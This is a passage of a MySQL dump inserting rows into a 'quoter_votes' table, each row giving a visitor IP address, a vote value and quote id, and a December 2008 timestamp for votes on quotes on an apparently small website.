  (5808,'80.251.112.37','',0,206,1229713009),
  (5809,'80.251.112.37','',0,208,1229713011),
  (5810,'80.251.112.37','',0,217,1229713014),
  (5811,'80.251.112.37','',0,218,1229713017),
  (5812,'80.251.112.37','',0,222,1229713018),
  (5813,'80.251.112.37','',0,224,1229713020),
  (5814,'67.159.44.138','',0,224,1229713054),
  (5815,'67.159.44.138','',0,222,1229713075),
  (5816,'67.159.44.138','',0,218,1229713095),
  (5817,'67.159.44.138','',0,217,1229713097),
  (5818,'67.159.44.138','',0,208,1229713099),
  (5819,'67.159.44.138','',0,206,1229713105),
  (5820,'67.159.44.138','',0,204,1229713106),
  (5821,'67.159.44.138','',0,201,1229713110),
  (5822,'67.159.44.138','',0,199,1229713112),
  (5823,'67.159.44.138','',0,197,1229713120),
  (5824,'94.248.39.65','',0,221,1229713350),
  (5825,'94.248.39.65','',0,222,1229713358),
  (5826,'67.202.43.229','',0,213,1229714327),
  (5827,'67.202.43.229','',0,215,1229714347),
  (5828,'67.202.43.229','',0,218,1229714351),
  (5829,'67.202.43.229','',0,221,1229714367),
  (5830,'67.202.43.229','',0,216,1229714508),
  (5831,'67.202.43.229','',0,217,1229714513),
  (5832,'67.202.43.229','',0,220,1229714531),
  (5833,'67.202.43.229','',0,219,1229714598),
  (5834,'67.202.43.229','',0,212,1229714713),
  (5835,'89.188.114.72','',0,214,1229717127),
  (5836,'91.203.96.56','',0,224,1229718919),
  (5837,'92.50.248.33','',0,195,1229720137),
  (5838,'78.37.122.212','',0,212,1229721010),
  (5839,'66.249.66.47','',0,219,1229722261),
  (5840,'66.249.66.47','',0,222,1229722625),
  (5841,'66.249.66.47','',0,220,1229722688),
  (5842,'66.249.66.47','',0,214,1229722984),
  (5843,'66.249.66.47','',0,223,1229723591),
  (5844,'88.84.200.91','',0,228,1229723721),
  (5845,'89.188.114.72','',0,228,1229724106),
  (5846,'66.249.66.47','',0,217,1229724128),
  (5847,'66.249.66.47','',0,218,1229724508),
  (5848,'92.112.67.118','',0,228,1229724756),
  (5849,'79.171.124.210','',0,228,1229725282),
  (5850,'74.6.18.231','',0,14,1229726685),
  (5851,'77.88.30.246','',0,215,1229726707),
  (5852,'77.88.30.246','',0,220,1229726718),
  (5853,'77.88.30.246','',0,217,1229726726),
  (5854,'77.88.30.246','',0,214,1229726749),
  (5855,'77.88.30.246','',0,221,1229726756),
  (5856,'77.88.30.246','',0,218,1229726766),
  (5857,'77.88.30.246','',0,216,1229726800),
  (5858,'77.88.30.246','',0,219,1229726812),
  (5859,'77.88.30.246','',0,222,1229726854),
  (5860,'65.55.25.153','',0,219,1229727917),
  (5861,'74.6.18.231','',0,76,1229729471),
  (5862,'66.249.66.47','',0,215,1229729985),
  (5863,'66.249.66.47','',0,222,1229734697),
  (5864,'66.249.66.47','',0,218,1229735399),
  (5865,'66.249.66.47','',0,216,1229736133),
  (5866,'80.243.71.189','',0,227,1229738449),
  (5867,'80.243.71.189','',0,224,1229738463),
  (5868,'80.243.71.189','',0,221,1229738468),
  (5869,'66.249.66.47','',0,219,1229739385),
  (5870,'66.249.66.47','',0,221,1229739473),
  (5871,'74.6.18.231','',0,55,1229741890),
  (5872,'74.6.18.231','',0,111,1229742658),
  (5873,'74.6.18.231','',0,205,1229742980),
  (5874,'74.6.18.231','',0,217,1229752239),
  (5875,'74.6.18.231','',0,62,1229752818),
  (5876,'74.6.18.231','',0,205,1229753685),
  (5877,'66.249.66.47','',0,226,1229754270),
  (5878,'72.30.142.237','',0,83,1229755420),
  (5879,'72.30.142.237','',0,44,1229755577),
  (5880,'80.243.71.189','',0,221,1229755709),
  (5881,'80.243.71.189','',0,224,1229755747),
  (5882,'84.109.97.94','',0,228,1229756376),
  (5883,'92.242.5.44','',0,223,1229758055),
  (5884,'72.30.142.237','',0,21,1229758498),
  (5885,'88.147.187.85','',0,73,1229759703),
  (5886,'80.80.111.200','',0,224,1229759952),
  (5887,'88.147.187.85','',0,140,1229760096),
  (5888,'72.30.142.237','',0,70,1229760425),
  (5889,'77.122.141.130','',0,120,1229760487),
  (5890,'92.50.248.41','',0,228,1229760666),
  (5891,'92.50.248.41','',0,143,1229760735),
  (5892,'92.50.248.41','',0,111,1229760767),
  (5893,'92.50.248.41','',0,3,1229760837),
  (5894,'78.24.225.27','',0,55,1229761666),
  (5895,'78.24.225.27','',0,1,1229761667),
  (5896,'66.249.66.47','',0,225,1229761748),
  (5897,'94.179.222.134','',0,183,1229761799),
  (5898,'66.249.66.47','',0,227,1229761960),
  (5899,'66.249.66.47','',0,224,1229762354),
  (5900,'66.249.66.47','',0,226,1229763958),
  (5901,'66.249.66.47','',0,228,1229764279),
  (5902,'66.249.66.47','',0,216,1229765100),
  (5903,'194.85.160.55','',0,228,1229765363),
  (5904,'78.37.169.60','',0,224,1229765763),
  (5905,'78.37.169.60','',0,223,1229765771),
  (5906,'78.37.169.60','',0,222,1229765776),
  (5907,'78.37.169.60','',0,221,1229765791),
  (5908,'89.146.71.204','',0,203,1229765820),
  (5909,'89.146.71.204','',0,87,1229765861),
  (5910,'89.146.71.204','',0,221,1229766110),
  (5911,'72.30.142.237','',0,203,1229766120),
  (5912,'72.30.142.237','',0,113,1229767318),
  (5913,'195.234.61.73','',0,165,1229767771),
  (5914,'195.234.61.73','',0,224,1229767853),
  (5915,'156.17.237.13','',0,228,1229770104),
  (5916,'213.184.248.166','',0,8,1229770369),
  (5917,'213.184.248.166','',0,9,1229770411),
  (5918,'213.184.248.166','',0,10,1229770423),
  (5919,'213.184.248.166','',0,13,1229770436),
  (5920,'213.184.248.166','',0,222,1229770455),
  (5921,'213.184.248.166','',0,218,1229770459),
  (5922,'213.184.248.166','',0,217,1229770465),
  (5923,'213.184.248.166','',0,208,1229770477),
  (5924,'213.184.248.166','',0,206,1229770479),
  (5925,'213.184.248.166','',0,204,1229770483),
  (5926,'72.30.142.237','',0,3,1229771792),
  (5927,'72.30.142.237','',0,90,1229771842),
  (5928,'194.6.197.42','',0,228,1229772787),
  (5929,'92.112.17.31','',0,173,1229773026),
  (5930,'92.112.17.31','',0,56,1229773030),
  (5931,'92.112.17.31','',0,119,1229773090),
  (5932,'92.112.17.31','',0,212,1229773163),
  (5933,'92.112.17.31','',0,215,1229773281),
  (5934,'72.30.142.237','',0,142,1229773627),
  (5935,'72.30.142.237','',0,147,1229773628),
  (5936,'72.30.142.237','',0,145,1229773835),
  (5937,'217.66.16.83','',0,221,1229774343),
  (5938,'72.30.142.237','',0,226,1229774759),
  (5939,'92.112.17.31','',0,213,1229775154),
  (5940,'72.30.142.237','',0,144,1229775190),
  (5941,'72.30.142.237','',0,138,1229776377),
  (5942,'81.19.66.89','',0,197,1229776522),
  (5943,'72.30.142.237','',0,143,1229776875),
  (5944,'94.253.19.190','',0,221,1229777680),
  (5945,'81.19.66.89','',0,199,1229777806),
  (5946,'81.19.66.89','',0,201,1229777807),
  (5947,'72.30.142.237','',0,213,1229777914),
  (5948,'89.232.201.207','',0,227,1229778019),
  (5949,'91.202.197.79','',0,221,1229778192),
  (5950,'81.19.66.89','',0,202,1229778360),
  (5951,'81.19.66.89','',0,203,1229778823),
  (5952,'81.19.66.89','',0,204,1229778825),
  (5953,'66.249.66.47','',0,214,1229779438),
  (5954,'81.19.66.89','',0,205,1229779470),
  (5955,'81.19.66.89','',0,206,1229779956),
  (5956,'81.19.66.89','',0,207,1229779958),
  (5957,'81.19.66.89','',0,208,1229780373),
  (5958,'81.19.66.89','',0,212,1229780374),
  (5959,'81.19.66.89','',0,213,1229780675),
  (5960,'81.19.66.89','',0,214,1229781090),
  (5961,'81.19.66.89','',0,215,1229781092),
  (5962,'81.19.66.89','',0,216,1229781451),
  (5963,'81.19.66.89','',0,217,1229781454),
  (5964,'81.19.66.89','',0,218,1229781741),
  (5965,'81.19.66.89','',0,219,1229781994),
  (5966,'81.19.66.89','',0,220,1229781995),
  (5967,'94.51.157.157','',0,218,1229782352),
  (5968,'78.37.122.212','',0,212,1229782513),
  (5969,'78.37.122.212','',0,226,1229782554),
  (5970,'78.37.122.212','',0,225,1229782558),
  (5971,'78.37.122.212','',0,228,1229782562),
  (5972,'193.232.92.242','',0,228,1229782992),
  (5973,'72.30.142.237','',0,228,1229783915),
  (5974,'94.25.145.200','',0,205,1229784231),
  (5975,'93.126.84.128','',0,228,1229785593),
  (5976,'92.244.233.170','',0,164,1229785647),
  (5977,'91.202.197.79','',0,231,1229786338),
  (5978,'91.202.197.79','',0,230,1229786350),
  (5979,'91.202.197.79','',0,229,1229786362),
  (5980,'89.188.114.72','',0,229,1229787519),
  (5981,'213.184.248.166','',0,8,1229787949),
  (5982,'213.184.248.166','',0,9,1229787959),
  (5983,'213.184.248.166','',0,176,1229787967),
  (5984,'213.184.248.166','',0,10,1229787986),
  (5985,'213.184.248.166','',0,13,1229788021),
  (5986,'78.138.155.114','',0,212,1229788276),
  (5987,'213.184.248.166','',0,232,1229788431),
  (5988,'213.184.248.166','',0,217,1229788445),
  (5989,'94.253.19.190','',0,232,1229788610),
  (5990,'72.30.142.237','',0,108,1229788923),
  (5991,'94.253.19.190','',0,231,1229788996),
  (5992,'92.242.17.120','',0,229,1229791489),
  (5993,'88.204.72.214','',0,229,1229792432),
  (5994,'90.150.235.175','',0,222,1229792767),
  (5995,'90.150.235.175','',0,199,1229794668),
  (5996,'89.139.75.229','',0,231,1229796515),
  (5997,'156.17.237.13','',0,233,1229796627),
  (5998,'92.255.154.250','',0,227,1229797766),
  (5999,'67.202.43.229','',0,224,1229798036),
  (6000,'67.202.43.229','',0,227,1229798041);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 6000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (6001,'77.120.129.130','',0,48,1229798403),
  (6002,'94.178.249.62','',0,234,1229799449),
  (6003,'66.231.188.53','',0,223,1229800881),
  (6004,'66.231.188.140','',0,55,1229801038),
  (6005,'195.46.35.49','',0,217,1229801874),
  (6006,'94.253.55.150','',0,229,1229802109),
  (6007,'94.253.55.150','',0,228,1229802130),
  (6008,'94.253.55.150','',0,234,1229802148),
  (6009,'72.30.142.237','',0,184,1229802449),
  (6010,'77.122.245.211','',0,234,1229803409),
  (6011,'193.178.34.38','',0,217,1229803868),
  (6012,'156.17.237.13','',0,234,1229804568),
  (6013,'156.17.237.13','',0,233,1229804573),
  (6014,'82.193.115.138','',0,216,1229806082),
  (6015,'72.30.142.237','',0,61,1229806085),
  (6016,'82.193.115.138','',0,215,1229806348),
  (6017,'82.193.115.138','',0,212,1229806509),
  (6018,'82.193.115.138','',0,206,1229806628),
  (6019,'82.193.115.138','',0,202,1229806868),
  (6020,'212.98.163.238','',0,229,1229807959),
  (6021,'67.202.43.229','',0,137,1229808369),
  (6022,'67.202.43.229','',0,140,1229808384),
  (6023,'67.202.43.229','',0,141,1229808389),
  (6024,'89.188.114.72','',0,234,1229808684),
  (6025,'89.188.114.72','',0,235,1229808690),
  (6026,'89.188.114.72','',0,233,1229808698),
  (6027,'89.188.114.72','',0,219,1229808816),
  (6028,'89.188.114.72','',0,218,1229808890),
  (6029,'85.141.173.232','',0,233,1229809085),
  (6030,'88.147.197.10','',0,235,1229809939),
  (6031,'79.171.124.210','',0,235,1229811831),
  (6032,'156.17.237.13','',0,235,1229811981),
  (6033,'91.122.16.186','',0,228,1229816209),
  (6034,'91.122.16.186','',0,226,1229816220),
  (6035,'91.122.16.186','',0,225,1229816224),
  (6036,'91.122.16.186','',0,212,1229816234),
  (6037,'89.178.20.254','',0,171,1229818351),
  (6038,'89.178.20.254','',0,165,1229818360),
  (6039,'89.178.20.254','',0,119,1229818500),
  (6040,'212.115.237.141','',0,54,1229822501),
  (6041,'78.24.227.85','',0,55,1229824588),
  (6042,'78.24.227.85','',0,1,1229824589),
  (6043,'91.103.78.49','',0,18,1229826476),
  (6044,'91.103.78.49','',0,63,1229827237),
  (6045,'72.30.142.237','',0,154,1229828617),
  (6046,'66.231.188.140','',0,48,1229828979),
  (6047,'72.30.142.237','',0,134,1229832529),
  (6048,'78.24.231.245','',0,55,1229835764),
  (6049,'78.24.231.245','',0,1,1229835765),
  (6050,'72.30.142.237','',0,201,1229836670),
  (6051,'87.118.115.69','',0,232,1229837346),
  (6052,'72.30.142.237','',0,222,1229837879),
  (6053,'72.30.142.237','',0,236,1229838045),
  (6054,'77.35.28.32','',0,119,1229838205),
  (6055,'77.35.28.32','',0,184,1229838468),
  (6056,'77.35.28.32','',0,21,1229838591),
  (6057,'87.118.115.69','',0,218,1229838714),
  (6058,'87.118.115.69','',0,216,1229838737),
  (6059,'87.118.115.69','',0,217,1229838806),
  (6060,'87.118.115.69','',0,213,1229839091),
  (6061,'87.118.115.69','',0,212,1229839275),
  (6062,'87.118.115.69','',0,197,1229839450),
  (6063,'87.118.115.69','',0,178,1229839858),
  (6064,'66.249.66.47','',0,29,1229840514),
  (6065,'66.249.66.47','',0,30,1229840846),
  (6066,'72.30.142.237','',0,140,1229841551),
  (6067,'66.249.66.47','',0,38,1229843047),
  (6068,'72.30.142.237','',0,220,1229845493),
  (6069,'72.30.142.237','',0,141,1229845808),
  (6070,'72.30.142.237','',0,224,1229845917),
  (6071,'72.30.142.237','',0,75,1229846470),
  (6072,'66.249.66.47','',0,234,1229846642),
  (6073,'78.29.78.85','',0,232,1229846705),
  (6074,'66.249.66.47','',0,236,1229847004),
  (6075,'66.249.66.47','',0,235,1229847450),
  (6076,'66.249.66.47','',0,233,1229848662),
  (6077,'66.249.66.47','',0,230,1229849005),
  (6078,'66.249.66.47','',0,229,1229849361),
  (6079,'81.1.232.213','',0,229,1229851362),
  (6080,'88.84.200.91','',0,237,1229851605),
  (6081,'195.22.104.19','',0,229,1229851669),
  (6082,'195.22.104.19','',0,223,1229851755),
  (6083,'94.178.144.165','',0,237,1229853000),
  (6084,'94.178.144.165','',0,236,1229853003),
  (6085,'94.178.144.165','',0,235,1229853006),
  (6086,'94.178.144.165','',0,234,1229853009),
  (6087,'94.178.144.165','',0,233,1229853011),
  (6088,'94.178.144.165','',0,232,1229853016),
  (6089,'94.178.144.165','',0,231,1229853018),
  (6090,'94.178.144.165','',0,230,1229853020),
  (6091,'94.178.144.165','',0,229,1229853022),
  (6092,'94.178.144.165','',0,227,1229853026),
  (6093,'94.178.144.165','',0,224,1229853058),
  (6094,'94.178.144.165','',0,222,1229853060),
  (6095,'94.178.144.165','',0,218,1229853063),
  (6096,'94.178.144.165','',0,217,1229853066),
  (6097,'94.178.144.165','',0,208,1229853070),
  (6098,'94.178.144.165','',0,206,1229853072),
  (6099,'94.178.144.165','',0,204,1229853075),
  (6100,'94.178.144.165','',0,201,1229853078),
  (6101,'94.178.144.165','',0,226,1229853087),
  (6102,'94.178.144.165','',0,225,1229853090),
  (6103,'94.178.144.165','',0,216,1229853092),
  (6104,'94.178.144.165','',0,215,1229853094),
  (6105,'94.178.144.165','',0,213,1229853096),
  (6106,'94.178.144.165','',0,212,1229853099),
  (6107,'94.178.144.165','',0,171,1229853102),
  (6108,'94.178.144.165','',0,165,1229853105),
  (6109,'94.178.144.165','',0,220,1229853112),
  (6110,'94.178.144.165','',0,207,1229853115),
  (6111,'94.178.144.165','',0,205,1229853117),
  (6112,'94.178.144.165','',0,184,1229853122),
  (6113,'94.178.144.165','',0,128,1229853124),
  (6114,'94.178.144.165','',0,108,1229853127),
  (6115,'94.178.144.165','',0,94,1229853129),
  (6116,'94.178.144.165','',0,86,1229853135),
  (6117,'94.178.144.165','',0,223,1229853139),
  (6118,'94.178.144.165','',0,214,1229853142),
  (6119,'94.178.144.165','',0,202,1229853144),
  (6120,'94.178.144.165','',0,190,1229853148),
  (6121,'94.178.144.165','',0,183,1229853150),
  (6122,'94.178.144.165','',0,178,1229853152),
  (6123,'94.178.144.165','',0,175,1229853155),
  (6124,'94.178.144.165','',0,173,1229853157),
  (6125,'94.178.144.165','',0,129,1229853160),
  (6126,'94.178.144.165','',0,180,1229853167),
  (6127,'94.178.144.165','',0,163,1229853169),
  (6128,'94.178.144.165','',0,143,1229853172),
  (6129,'94.178.144.165','',0,139,1229853174),
  (6130,'94.178.144.165','',0,133,1229853179),
  (6131,'94.178.144.165','',0,111,1229853183),
  (6132,'94.178.144.165','',0,89,1229853185),
  (6133,'94.178.144.165','',0,77,1229853187),
  (6134,'94.178.144.165','',0,70,1229853189),
  (6135,'94.178.144.165','',0,14,1229853192),
  (6136,'94.178.144.165','',0,203,1229853198),
  (6137,'94.178.144.165','',0,147,1229853199),
  (6138,'94.178.144.165','',0,113,1229853202),
  (6139,'94.178.144.165','',0,88,1229853206),
  (6140,'94.178.144.165','',0,87,1229853210),
  (6141,'94.178.144.165','',0,54,1229853216),
  (6142,'94.178.144.165','',0,221,1229853217),
  (6143,'94.178.144.165','',0,118,1229853221),
  (6144,'94.178.144.165','',0,110,1229853224),
  (6145,'94.178.144.165','',0,74,1229853226),
  (6146,'94.178.144.165','',0,24,1229853228),
  (6147,'94.178.144.165','',0,23,1229853231),
  (6148,'94.178.144.165','',0,136,1229853235),
  (6149,'94.178.144.165','',0,135,1229853237),
  (6150,'94.178.144.165','',0,73,1229853239),
  (6151,'94.178.144.165','',0,58,1229853243),
  (6152,'94.178.144.165','',0,44,1229853247),
  (6153,'94.178.144.165','',0,144,1229853251),
  (6154,'94.178.144.165','',0,130,1229853255),
  (6155,'94.178.144.165','',0,85,1229853257),
  (6156,'94.178.144.165','',0,84,1229853259),
  (6157,'94.178.144.165','',0,12,1229853262),
  (6158,'94.178.144.165','',0,152,1229853268),
  (6159,'94.178.144.165','',0,125,1229853273),
  (6160,'94.178.144.165','',0,99,1229853276),
  (6161,'94.178.144.165','',0,62,1229853278),
  (6162,'94.178.144.165','',0,50,1229853280),
  (6163,'94.178.144.165','',0,138,1229853283),
  (6164,'94.178.144.165','',0,100,1229853285),
  (6165,'94.178.144.165','',0,60,1229853288),
  (6166,'94.178.144.165','',0,55,1229853294),
  (6167,'94.178.144.165','',0,219,1229853296),
  (6168,'94.178.144.165','',0,134,1229853300),
  (6169,'94.178.144.165','',0,199,1229853312),
  (6170,'94.178.144.165','',0,197,1229853315),
  (6171,'94.178.144.165','',0,195,1229853316),
  (6172,'94.178.144.165','',0,189,1229853319),
  (6173,'94.178.144.165','',0,185,1229853323),
  (6174,'94.178.144.165','',0,177,1229853329),
  (6175,'94.178.144.165','',0,176,1229853334),
  (6176,'94.178.144.165','',0,172,1229853335),
  (6177,'94.178.144.165','',0,2,1229853341),
  (6178,'94.178.144.165','',0,1,1229853343),
  (6179,'94.178.144.165','',0,21,1229853352),
  (6180,'94.178.144.165','',0,29,1229853355),
  (6181,'94.178.144.165','',0,18,1229853357),
  (6182,'94.178.144.165','',0,56,1229853358),
  (6183,'94.178.144.165','',0,120,1229853362),
  (6184,'94.178.144.165','',0,140,1229853364),
  (6185,'94.178.144.165','',0,109,1229853366),
  (6186,'88.204.72.214','',0,235,1229856055),
  (6187,'72.30.142.237','',0,199,1229856739),
  (6188,'78.106.7.231','',0,50,1229856768),
  (6189,'93.185.182.24','',0,238,1229856925),
  (6190,'91.202.197.79','',0,238,1229857605),
  (6191,'91.202.197.79','',0,237,1229857657),
  (6192,'91.202.197.79','',0,236,1229857666),
  (6193,'91.202.197.79','',0,235,1229857676),
  (6194,'91.202.197.79','',0,234,1229857679),
  (6195,'91.202.197.79','',0,233,1229857692),
  (6196,'91.185.53.41','',0,237,1229857790),
  (6197,'92.54.122.180','',0,237,1229857837),
  (6198,'193.93.218.67','',0,237,1229857843),
  (6199,'88.204.16.169','',0,99,1229857948),
  (6200,'88.204.16.169','',0,62,1229857954),
  (6201,'88.204.16.169','',0,12,1229858057),
  (6202,'72.30.142.237','',0,207,1229858120),
  (6203,'93.120.158.61','',0,237,1229858188),
  (6204,'95.24.43.250','',0,238,1229858251),
  (6205,'91.122.16.186','',0,237,1229858312),
  (6206,'91.122.16.186','',0,226,1229858386),
  (6207,'72.30.142.237','',0,136,1229858403),
  (6208,'77.120.67.78','',0,219,1229858749),
  (6209,'156.17.237.13','',0,238,1229858758),
  (6210,'156.17.237.13','',0,234,1229858845),
  (6211,'156.17.237.13','',0,237,1229858953),
  (6212,'156.17.237.13','',0,205,1229859047),
  (6213,'72.30.142.237','',0,155,1229859217),
  (6214,'87.119.238.29','',0,237,1229859252),
  (6215,'90.151.201.236','',0,237,1229859274),
  (6216,'81.18.116.69','',0,237,1229859605),
  (6217,'81.18.116.69','',0,233,1229859672),
  (6218,'81.18.116.69','',0,235,1229859784),
  (6219,'72.30.142.237','',0,164,1229860243),
  (6220,'89.232.201.201','',0,235,1229860642),
  (6221,'90.151.110.72','',0,233,1229860646),
  (6222,'88.204.16.169','',0,213,1229860649),
  (6223,'90.151.110.72','',0,218,1229860683),
  (6224,'72.30.142.237','',0,161,1229860692),
  (6225,'88.204.16.169','',0,165,1229860765),
  (6226,'89.232.201.201','',0,226,1229860857),
  (6227,'77.122.141.130','',0,237,1229860907),
  (6228,'72.30.142.237','',0,163,1229861079),
  (6229,'84.19.181.92','',0,237,1229861104),
  (6230,'89.41.94.79','',0,236,1229861311),
  (6231,'77.122.229.100','',0,237,1229861320),
  (6232,'89.41.94.79','',0,239,1229861382),
  (6233,'80.93.115.10','',0,238,1229861392),
  (6234,'80.93.115.10','',0,237,1229861412),
  (6235,'89.41.94.79','',0,238,1229861421),
  (6236,'80.93.115.10','',0,236,1229861443),
  (6237,'80.93.115.10','',0,235,1229861455),
  (6238,'77.122.141.130','',0,239,1229861468),
  (6239,'72.30.142.237','',0,159,1229861484),
  (6240,'77.122.141.130','',0,238,1229861488),
  (6241,'80.93.115.10','',0,233,1229861492),
  (6242,'80.93.115.10','',0,232,1229861517),
  (6243,'80.93.115.10','',0,231,1229861567),
  (6244,'80.93.115.10','',0,230,1229861599),
  (6245,'80.93.115.10','',0,229,1229861641),
  (6246,'80.93.115.10','',0,225,1229861704),
  (6247,'80.93.115.10','',0,223,1229861764),
  (6248,'80.93.115.10','',0,222,1229861802),
  (6249,'80.93.115.10','',0,221,1229861810),
  (6250,'80.93.115.10','',0,220,1229861825),
  (6251,'80.93.115.10','',0,218,1229861860),
  (6252,'72.30.142.237','',0,108,1229862242),
  (6253,'78.85.230.249','',0,233,1229864080),
  (6254,'79.111.110.58','',0,195,1229864414),
  (6255,'78.24.224.47','',0,55,1229864761),
  (6256,'78.24.224.47','',0,1,1229864763),
  (6257,'95.24.235.174','',0,238,1229865005),
  (6258,'95.24.235.174','',0,239,1229865007),
  (6259,'72.30.142.237','',0,146,1229865810),
  (6260,'92.242.8.128','',0,238,1229866393),
  (6261,'92.242.8.128','',0,235,1229866455),
  (6262,'78.29.95.172','',0,235,1229867674),
  (6263,'66.231.188.53','',0,221,1229868422),
  (6264,'66.231.188.53','',0,219,1229869189),
  (6265,'94.51.35.246','',0,239,1229870429),
  (6266,'66.231.188.53','',0,227,1229870753),
  (6267,'72.30.142.237','',0,111,1229871317),
  (6268,'212.98.163.238','',0,237,1229871657),
  (6269,'81.18.116.69','',0,239,1229873217),
  (6270,'94.26.143.210','',0,238,1229874042),
  (6271,'72.30.142.237','',0,154,1229874833),
  (6272,'66.249.66.47','',0,30,1229875771),
  (6273,'84.51.196.70','',0,235,1229876470),
  (6274,'66.231.188.140','',0,56,1229876670),
  (6275,'66.249.66.47','',0,134,1229876698),
  (6276,'66.249.66.47','',0,29,1229876791),
  (6277,'89.139.75.229','',0,239,1229877161),
  (6278,'89.139.75.229','',0,238,1229877165),
  (6279,'89.139.75.229','',0,236,1229877712),
  (6280,'89.139.75.229','',0,235,1229877737),
  (6281,'89.139.75.229','',0,234,1229877764),
  (6282,'66.249.66.47','',0,237,1229879385),
  (6283,'66.249.66.47','',0,238,1229879648),
  (6284,'72.30.142.237','',0,139,1229880083),
  (6285,'72.30.142.237','',0,128,1229881247),
  (6286,'69.80.244.163','',0,139,1229881596),
  (6287,'69.80.244.163','',0,140,1229881600),
  (6288,'69.80.244.163','',0,141,1229881605),
  (6289,'69.80.244.163','',0,142,1229881610),
  (6290,'69.80.244.163','',0,143,1229881615),
  (6291,'69.80.244.163','',0,144,1229881621),
  (6292,'69.80.244.163','',0,145,1229881627),
  (6293,'69.80.244.163','',0,146,1229881631),
  (6294,'69.80.244.163','',0,147,1229881637),
  (6295,'69.80.244.163','',0,152,1229881642),
  (6296,'69.80.244.163','',0,154,1229881651),
  (6297,'69.80.244.163','',0,155,1229881656),
  (6298,'69.80.244.163','',0,156,1229881661),
  (6299,'69.80.244.163','',0,157,1229881665),
  (6300,'69.80.244.163','',0,159,1229881670),
  (6301,'69.80.244.163','',0,161,1229881674),
  (6302,'69.80.244.163','',0,163,1229881679),
  (6303,'69.80.244.163','',0,164,1229881686),
  (6304,'69.80.244.163','',0,165,1229881690),
  (6305,'69.80.244.163','',0,171,1229881694),
  (6306,'69.80.244.163','',0,100,1229881699),
  (6307,'69.80.244.163','',0,102,1229881705),
  (6308,'69.80.244.163','',0,103,1229881710),
  (6309,'69.80.244.163','',0,104,1229881714),
  (6310,'69.80.244.163','',0,105,1229881719),
  (6311,'69.80.244.163','',0,106,1229881725),
  (6312,'69.80.244.163','',0,107,1229881730),
  (6313,'69.80.244.163','',0,108,1229881735),
  (6314,'69.80.244.163','',0,109,1229881741),
  (6315,'69.80.244.163','',0,110,1229881746),
  (6316,'69.80.244.163','',0,111,1229881755),
  (6317,'69.80.244.163','',0,113,1229881759),
  (6318,'69.80.244.163','',0,114,1229881764),
  (6319,'69.80.244.163','',0,115,1229881769),
  (6320,'69.80.244.163','',0,117,1229881777),
  (6321,'69.80.244.163','',0,118,1229881784),
  (6322,'69.80.244.163','',0,119,1229881791),
  (6323,'69.80.244.163','',0,120,1229881806),
  (6324,'69.80.244.163','',0,122,1229881811),
  (6325,'69.80.244.163','',0,124,1229881818),
  (6326,'69.80.244.163','',0,125,1229881828),
  (6327,'69.80.244.163','',0,128,1229881832),
  (6328,'69.80.244.163','',0,129,1229881839),
  (6329,'69.80.244.163','',0,130,1229881847),
  (6330,'69.80.244.163','',0,133,1229881852),
  (6331,'69.80.244.163','',0,134,1229881858),
  (6332,'91.202.130.28','',0,225,1229881862),
  (6333,'69.80.244.163','',0,135,1229881863),
  (6334,'69.80.244.163','',0,136,1229881869),
  (6335,'69.80.244.163','',0,137,1229881877),
  (6336,'69.80.244.163','',0,138,1229881883),
  (6337,'69.80.244.163','',0,75,1229881890),
  (6338,'69.80.244.163','',0,76,1229881899),
  (6339,'69.80.244.163','',0,77,1229881904),
  (6340,'69.80.244.163','',0,79,1229881909),
  (6341,'69.80.244.163','',0,80,1229881917),
  (6342,'69.80.244.163','',0,81,1229881935),
  (6343,'69.80.244.163','',0,83,1229881942),
  (6344,'69.80.244.163','',0,84,1229881946),
  (6345,'69.80.244.163','',0,85,1229881953),
  (6346,'69.80.244.163','',0,86,1229881965),
  (6347,'69.80.244.163','',0,87,1229881977),
  (6348,'69.80.244.163','',0,88,1229881986),
  (6349,'69.80.244.163','',0,89,1229881991),
  (6350,'69.80.244.163','',0,90,1229881996),
  (6351,'69.80.244.163','',0,93,1229882001),
  (6352,'69.80.244.163','',0,94,1229882007),
  (6353,'69.80.244.163','',0,95,1229882014),
  (6354,'69.80.244.163','',0,96,1229882021),
  (6355,'69.80.244.163','',0,98,1229882027),
  (6356,'89.188.114.72','',0,237,1229882027),
  (6357,'69.80.244.163','',0,99,1229882030),
  (6358,'69.80.244.163','',0,16,1229882036),
  (6359,'69.80.244.163','',0,21,1229882045),
  (6360,'69.80.244.163','',0,23,1229882051),
  (6361,'69.80.244.163','',0,24,1229882057),
  (6362,'69.80.244.163','',0,25,1229882068),
  (6363,'69.80.244.163','',0,29,1229882074),
  (6364,'69.80.244.163','',0,30,1229882080),
  (6365,'69.80.244.163','',0,38,1229882088),
  (6366,'69.80.244.163','',0,39,1229882094),
  (6367,'69.80.244.163','',0,44,1229882101),
  (6368,'69.80.244.163','',0,48,1229882113),
  (6369,'69.80.244.163','',0,49,1229882119),
  (6370,'69.80.244.163','',0,50,1229882126),
  (6371,'69.80.244.163','',0,53,1229882133),
  (6372,'69.80.244.163','',0,54,1229882144),
  (6373,'69.80.244.163','',0,55,1229882149),
  (6374,'69.80.244.163','',0,56,1229882153),
  (6375,'69.80.244.163','',0,58,1229882158),
  (6376,'69.80.244.163','',0,60,1229882166),
  (6377,'69.80.244.163','',0,61,1229882173),
  (6378,'69.80.244.163','',0,62,1229882182),
  (6379,'69.80.244.163','',0,63,1229882186),
  (6380,'69.80.244.163','',0,66,1229882190),
  (6381,'69.80.244.163','',0,67,1229882198),
  (6382,'69.80.244.163','',0,68,1229882204),
  (6383,'69.80.244.163','',0,69,1229882210),
  (6384,'69.80.244.163','',0,70,1229882214),
  (6385,'69.80.244.163','',0,71,1229882220),
  (6386,'69.80.244.163','',0,73,1229882232),
  (6387,'69.80.244.163','',0,74,1229882238),
  (6388,'69.80.244.163','',0,6,1229882247),
  (6389,'69.80.244.163','',0,8,1229882253),
  (6390,'69.80.244.163','',0,9,1229882259),
  (6391,'69.80.244.163','',0,10,1229882265),
  (6392,'69.80.244.163','',0,11,1229882270),
  (6393,'69.80.244.163','',0,13,1229882273),
  (6394,'69.80.244.163','',0,14,1229882278),
  (6395,'69.80.244.163','',0,12,1229882282),
  (6396,'69.80.244.163','',0,20,1229882287),
  (6397,'69.80.244.163','',0,18,1229882291),
  (6398,'69.80.244.163','',0,1,1229882296),
  (6399,'69.80.244.163','',0,2,1229882301),
  (6400,'69.80.244.163','',0,3,1229882304),
  (6401,'69.80.244.163','',0,4,1229882308),
  (6402,'69.80.244.163','',0,172,1229882316),
  (6403,'69.80.244.163','',0,173,1229882320),
